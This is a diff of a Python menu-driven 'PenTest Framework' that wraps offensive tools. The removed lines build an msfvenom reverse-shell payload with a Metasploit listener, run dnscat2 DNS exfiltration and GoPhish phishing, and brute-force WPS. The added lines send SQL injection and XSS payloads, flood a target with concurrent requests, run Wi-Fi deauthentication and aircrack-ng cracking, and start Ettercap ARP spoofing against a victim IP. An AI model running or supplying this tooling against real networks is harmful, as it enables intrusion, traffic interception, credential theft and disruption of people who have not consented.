@@ -1,133 +1,169 @@
 import os
-from pyfiglet import figlet_format
-from termcolor import colored
 import subprocess
-import time
+import requests
+import threading
+from urllib.parse import urljoin, urlencode
+from termcolor import colored
+from bs4 import BeautifulSoup
+
+# Global settings
+TARGET_URL = ""  # Placeholder for target URL
+SESSION = requests.Session()
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+}
 
 # Function to display the main banner
 def display_banner():
-    banner = figlet_format("PenTest Framework")
+    banner = "PenTest Framework"
     print(colored(banner, "cyan"))
-    print(colored("By 41PH4-01: Comprehensive Ethical Hacking Toolkit", "yellow"))
     print(colored("=" * 70, "green"))
-    print("\nChoose an option to start exploring advanced features below:\n")
 
-# Function to display section headers
-def display_section_header(title):
-    print(colored(f"\n[--- {title} ---]", "magenta"))
-    print(colored("-" * (len(title) + 10), "white"))
+# --- Sub-functions for Web Application Testing ---
+def test_race_condition(url, param_name, value):
+    def send_request():
+        data = {param_name: value}
+        response = SESSION.post(url, data=data, headers=HEADERS)
+        print(f"Race Condition Attempt - Status: {response.status_code}")
 
-# Function to display the main menu with options
+    threads = []
+    for _ in range(10):  # 10 simultaneous requests
+        thread = threading.Thread(target=send_request)
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
+
+def test_sql_injection(url, param_name):
+    payload = "' OR 1=1 --"
+    params = {param_name: payload}
+    full_url = f"{url}?{urlencode(params)}"
+    response = SESSION.get(full_url, headers=HEADERS)
+    
+    if "error" in response.text.lower():
+        print("SQL Injection vulnerability found!")
+    else:
+        print("No SQL Injection vulnerability detected.")
+
+def test_cross_site_scripting(url, param_name):
+    payload = "<script>alert('XSS')</script>"
+    params = {param_name: payload}
+    full_url = f"{url}?{urlencode(params)}"
+    response = SESSION.get(full_url, headers=HEADERS)
+
+    if payload in response.text:
+        print("XSS vulnerability found!")
+    else:
+        print("No XSS vulnerability detected.")
+
+# --- Sub-functions for Wi-Fi & Network Attacks ---
+def wifi_attack_options():
+    print(colored("[Wi-Fi Attack Options]", "magenta"))
+    print("[1] Set Interface to Monitor Mode")
+    print("[2] Start Aircrack-ng Capture")
+    print("[3] Perform Wi-Fi Deauthentication Attack")
+    print("[4] Back to Main Menu")
+
+    choice = input(colored("\nEnter your choice: ", "yellow"))
+    
+    if choice == '1':
+        set_interface_monitor_mode()
+    elif choice == '2':
+        start_aircrack_ng()
+    elif choice == '3':
+        wifi_deauth_attack()
+    elif choice == '4':
+        return
+    else:
+        print(colored("Invalid choice, try again.", "red"))
+
+def set_interface_monitor_mode():
+    interface = input(colored("\nEnter the wireless interface (e.g., wlan0): ", "yellow"))
+    print(f"Setting {interface} to monitor mode...")
+    subprocess.run(["airmon-ng", "start", interface])
+
+def start_aircrack_ng():
+    interface = input(colored("\nEnter the interface for packet capture (e.g., wlan0mon): ", "yellow"))
+    capture_file = input(colored("Enter the capture file name (e.g., capture.cap): ", "yellow"))
+    print(f"Starting Aircrack-ng on {interface}...")
+    subprocess.run(["airodump-ng", interface, "--output", capture_file])
+    print(f"Packet capture started and saved to {capture_file}. Now running Aircrack-ng on {capture_file}...")
+    subprocess.run(["aircrack-ng", capture_file])
+
+def wifi_deauth_attack():
+    target = input(colored("\nEnter the target AP MAC address: ", "yellow"))
+    client = input(colored("Enter the target client MAC address: ", "yellow"))
+    interface = input(colored("Enter the interface in monitor mode (e.g., wlan0mon): ", "yellow"))
+    print(f"Performing deauthentication attack on {target} targeting {client}...")
+    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target, "-c", client, interface])
+
+# --- Sub-functions for MITM Attacks ---
+def mitm_attack_options():
+    print(colored("[MITM Attack Options]", "magenta"))
+    print("[1] Start Ettercap ARP Spoofing")
+    print("[2] Back to Main Menu")
+
+    choice = input(colored("\nEnter your choice: ", "yellow"))
+    
+    if choice == '1':
+        start_ettercap_mitm()
+    elif choice == '2':
+        return
+    else:
+        print(colored("Invalid choice, try again.", "red"))
+
+def start_ettercap_mitm():
+    victim_ip = input(colored("\nEnter victim IP: ", "yellow"))
+    gateway_ip = input(colored("Enter gateway IP: ", "yellow"))
+    interface = input(colored("Enter the interface (e.g., eth0): ", "yellow"))
+    print(f"Starting ARP spoofing on {interface} to intercept traffic from {victim_ip}...")
+    subprocess.run(["ettercap", "-T", "-q", "-i", interface, "-M", "ARP", f"/{victim_ip}/", f"/{gateway_ip}/"])
+
+# --- Main Menu and Sub-options ---
 def main_menu():
-    menu_options = {
-        1: "Information Gathering",
-        2: "Web Application Testing",
-        3: "Payload Generation",
-        4: "Post-Exploitation Tools",
-        5: "Social Engineering",
-        6: "Wi-Fi & Network Attacks",
-        7: "Vulnerability Scanning",
-        8: "Exit Framework"
-    }
-    
-    print("\nSelect an option:")
-    for key, value in menu_options.items():
-        print(colored(f"[{key}] {value}", "blue"))
-
-# Information Gathering
-def information_gathering():
-    display_section_header("Information Gathering")
-    print("Running domain enumeration...")
-    subprocess.run(['sublist3r', '-d', 'example.com'])  # Sublist3r for subdomain enumeration
-    print("Running Shodan scan...")
-    subprocess.run(['shodan', 'search', 'example.com'])  # Shodan API scan
-    print("Running Whois...")
-    subprocess.run(['whois', 'example.com'])  # Whois lookup
-
-# Web Application Testing
-def web_application_testing():
-    display_section_header("Web Application Testing")
-    print("Running SQLMap for SQL Injection testing...")
-    subprocess.run(['sqlmap', '-u', 'http://example.com/page.php?id=1'])  # SQLMap test
-    print("Running XSStrike for XSS testing...")
-    subprocess.run(['xsstrike', '-u', 'http://example.com/login'])  # XSStrike XSS testing
-    print("Running Nikto for web vulnerability scanning...")
-    subprocess.run(['nikto', '-h', 'http://example.com'])  # Nikto scan for common vulnerabilities
-
-# Payload Generation
-def payload_generation():
-    display_section_header("Payload Generation")
-    print("Generating reverse shell payload with msfvenom...")
-    subprocess.run(['msfvenom', '-p', 'windows/meterpreter/reverse_tcp', 'LHOST=127.0.0.1', 'LPORT=4444', '-f', 'exe', '-o', 'payload.exe'])
-    print("Payload created: payload.exe")
-    
-    # Launch listener in background
-    print("Starting Metasploit listener...")
-    subprocess.run(['msfconsole', '-x', 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 127.0.0.1; set LPORT 4444; run'])
-
-# Post-Exploitation Tools
-def post_exploitation_tools():
-    display_section_header("Post-Exploitation Tools")
-    print("Running privilege escalation...")
-    subprocess.run(['linux-exploit-suggester'])  # LPE suggestion for Linux systems
-    subprocess.run(['windows-exploit-suggester'])  # LPE suggestion for Windows systems
-    print("Exfiltrating data via DNS tunneling...")
-    subprocess.run(['dnscat2', '-l', '127.0.0.1:53'])  # Data exfiltration using dnscat2
-
-# Social Engineering (Phishing, Email Campaigns)
-def social_engineering():
-    display_section_header("Social Engineering")
-    print("Setting up GoPhish for phishing...")
-    subprocess.run(['gophish', 'start'])  # Start GoPhish for phishing campaigns
-    print("Creating phishing emails...")
-    subprocess.run(['sendgrid', 'send', '--to', 'victim@example.com', '--subject', 'Fake Login Attempt'])  # SendGrid for phishing emails
-
-# Wi-Fi & Network Attacks
-def wifi_network_attacks():
-    display_section_header("Wi-Fi & Network Attacks")
-    print("Running aircrack-ng for WPA2 attack...")
-    subprocess.run(['aircrack-ng', 'capture.cap'])  # WPA2 Crack with Aircrack
-    print("Running Ettercap for MITM attack...")
-    subprocess.run(['ettercap', '-T', '-q', '-i', 'eth0', '-M', 'ARP', '/192.168.1.1/', '/192.168.1.100/'])  # MITM with Ettercap
-    print("Running Reaver for WPS brute force attack...")
-    subprocess.run(['reaver', '-i', 'wlan0', '-b', '00:11:22:33:44:55', '-vv'])  # WPS brute force with Reaver
-
-# Vulnerability Scanning (Nessus & OpenVAS)
-def vulnerability_scanning():
-    display_section_header("Vulnerability Scanning")
-    print("Running OpenVAS scan...")
-    subprocess.run(['openvas', '--scan', '--target', 'http://example.com'])  # OpenVAS scan
-    print("Running Nessus scan...")
-    subprocess.run(['nessus', '--scan', '--target', 'http://example.com'])  # Nessus scan
-
-# Main function to handle user interaction
-if __name__ == "__main__":
-    # Display the banner at the start
     display_banner()
-
-    # Main loop to handle user selections
     while True:
-        main_menu()
-        try:
-            choice = int(input(colored("\nEnter your choice: ", "yellow")))
-            if choice == 1:
-                information_gathering()
-            elif choice == 2:
-                web_application_testing()
-            elif choice == 3:
-                payload_generation()
-            elif choice == 4:
-                post_exploitation_tools()
-            elif choice == 5:
-                social_engineering()
-            elif choice == 6:
-                wifi_network_attacks()
-            elif choice == 7:
-                vulnerability_scanning()
-            elif choice == 8:
-                print(colored("Exiting... Thank you for using the toolkit!", "red"))
-                break
-            else:
-                print(colored("Invalid choice, please select a valid option.", "red"))
-        except ValueError:
-            print(colored("Please enter a valid number.", "red"))
+        print("[1] Web Application Testing")
+        print("[2] Wi-Fi & Network Attacks")
+        print("[3] MITM Attacks")
+        print("[4] Exit Framework")
+
+        choice = input(colored("\nEnter your choice: ", "yellow"))
+
+        if choice == '1':
+            web_app_testing_options()
+        elif choice == '2':
+            wifi_attack_options()
+        elif choice == '3':
+            mitm_attack_options()
+        elif choice == '4':
+            print(colored("Exiting... Thank you for using the toolkit!", "red"))
+            break
+        else:
+            print(colored("Invalid choice, please select a valid option.", "red"))
+
+# --- Web Application Testing Sub-menu ---
+def web_app_testing_options():
+    print(colored("[Web Application Testing]", "magenta"))
+    print("[1] Test for SQL Injection")
+    print("[2] Test for XSS Vulnerability")
+    print("[3] Test for Race Condition")
+    print("[4] Back to Main Menu")
+
+    choice = input(colored("\nEnter your choice: ", "yellow"))
+    
+    if choice == '1':
+        test_sql_injection(TARGET_URL, "param1")
+    elif choice == '2':
+        test_cross_site_scripting(TARGET_URL, "param1")
+    elif choice == '3':
+        test_race_condition(TARGET_URL, "param1", "value")
+    elif choice == '4':
+        return
+    else:
+        print(colored("Invalid choice, try again.", "red"))
+
+# Run the main menu
+if __name__ == "__main__":
+    main_menu()
